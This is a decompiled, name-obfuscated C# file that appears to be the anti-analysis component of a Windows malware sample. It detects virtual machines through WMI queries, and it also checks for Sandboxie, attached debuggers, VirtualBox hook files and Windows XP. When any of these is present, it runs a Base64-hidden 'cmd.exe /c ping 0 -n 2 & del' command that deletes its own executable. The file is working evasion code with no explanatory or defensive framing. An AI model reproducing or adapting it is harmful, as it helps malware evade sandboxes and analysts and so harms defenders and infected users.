using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using ns1;
using ns2;

namespace ns0;

public class GClass0
{
	[DllImport("kernel32.dll")]
	public static extern bool LoadLibrary(string string_0);

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static void smethod_0()
	{
		try
		{
			if (smethod_1() || GClass1.smethod_2().ToString()!.ToLower().Contains("XP".ToLower()) || LoadLibrary("SbieDll.dll") || Debugger.IsLogging() || Debugger.IsAttached || File.Exists(Environment.GetEnvironmentVariable("windir") + "\\vboxhook.dll"))
			{
				Interaction.Shell(Class0.smethod_1(Convert.FromBase64String("Y21kLmV4ZSAvYyBwaW5nIDAgLW4gMiAmIGRlbCA=")) + "\"" + Application.get_ExecutablePath() + "\"", (AppWinStyle)0, false, -1);
				ProjectData.EndApp();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private static bool smethod_1()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		try
		{
			ManagementObjectSearcher val = new ManagementObjectSearcher("Select * from Win32_ComputerSystem");
			try
			{
				ManagementObjectCollection val2 = val.Get();
				try
				{
					ManagementObjectEnumerator enumerator = default(ManagementObjectEnumerator);
					try
					{
						enumerator = val2.GetEnumerator();
						while (enumerator.MoveNext())
						{
							ManagementBaseObject current = enumerator.get_Current();
							string text = current.get_Item("Manufacturer").ToString()!.ToLower();
							if ((Operators.CompareString(text, "microsoft corporation", false) == 0 && current.get_Item("Model").ToString()!.ToUpperInvariant().Contains("VIRTUAL")) || text.Contains("vmware") || Operators.CompareString(current.get_Item("Model").ToString(), "VirtualBox", false) == 0)
							{
								return true;
							}
						}
					}
					finally
					{
						((IDisposable)enumerator)?.Dispose();
					}
				}
				finally
				{
					((IDisposable)val2)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		return false;
	}
}
